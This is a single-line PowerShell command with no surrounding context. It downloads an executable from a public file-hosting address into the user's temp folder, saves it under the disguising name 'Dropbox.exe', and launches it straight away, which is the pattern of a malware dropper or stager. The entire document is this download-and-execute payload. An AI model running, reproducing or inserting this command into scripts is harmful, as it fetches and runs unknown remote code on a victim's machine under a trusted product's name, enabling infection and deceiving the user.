
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',"$env:TEMP\Dropbox.exe");Start-Process ("$env:TEMP\Dropbox.exe")

